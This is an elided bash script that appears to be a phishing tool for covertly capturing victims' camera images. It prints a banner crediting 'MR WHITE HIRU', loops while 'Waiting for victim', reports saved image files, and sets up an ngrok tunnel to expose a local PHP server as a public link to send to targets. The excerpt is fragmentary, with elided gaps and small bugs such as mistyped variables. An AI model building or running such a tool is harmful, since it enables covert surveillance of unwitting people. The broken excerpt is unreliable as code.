...
printf "\e[1;92m ░╚════╝░╚═╝░░╚═╝╚═╝░░░░░╚═╝  \e[0m\e[1;77m╚═╝░░╚═╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝\e[0m\n"
printf "\n"
printf " \e[1;93m                                        [*]   code by :-MR WHITE HIRU \e[0m \n"
printf " \e[1;77m                                       [*]   CAPTION OF HISL \e[0m \n"
...
printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] [*][*]Waiting for victim[*][*]\e[0m\e[1;77m [/*\]Press Ctrl + C to exit...\e[0m\n"
while [ true ]; do
...
if [[ -e "Log.log" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] One image file saved!\e[0m\n"
rm -rf Log.log
fi
sleep 0.5
...
command -v ssh > /dev/null 2>&1 || { echo >&2 "ssh not installed!!Install it :D"; exit 1; }

printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Server Starting..\e[0m\n"
...
command -v unzip > /dev/null 2>&1 || { echo >&2 "[!] unzip not installed. Install it"; exit 1; }
command -v wget > /dev/null 2>&1 || { echo >&2 " [!] wget not installed. Install it"; exit 1; }
...
printf "\e[1;93m[!]error[!],\n run:\e[0m\e[1;77m pkg install wget\e[0m\n"
exit 1
fi
...
printf "\e[1;93m[\e[0m*\e[1;93m] your ngrok token"
cat  ~/.ngrok2/ngrok.yml
read -p $'\n\e[1;92m[\e[0m+\e[1;92m] Do you change your ngrok authtoken? [y/n]:\e[0m ' chg_token
if [[ $chg_token == "Y" || $chg_token == "y" || $cchg_token == "Yes" || $cchg_token == "yes" ]]; then
read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] [#] Enter valid ngrok authtoken: \e[0m' ngrok_auth
./ngrok authtoken $ngrok_auth >  /dev/null 2>&1 &
printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m[#] Authtoken has been changed\n"
fi
else
read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m][#] Enter valid ngrok authtoken: \e[0m' ngrok_auth
./ngrok authtoken $ngrok_auth >  /dev/null 2>&1 &
...
link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^/"]*\.ngrok.io')
if [[ -z "$link" ]]; then
printf "\e[1;31m[!] \ [!] link is not generating, check following reason  \e[0m\n"
...
command -v php > /dev/null 2>&1 || { echo >&2 "[!] ssh not installed. Install it"; exit 1; }
start
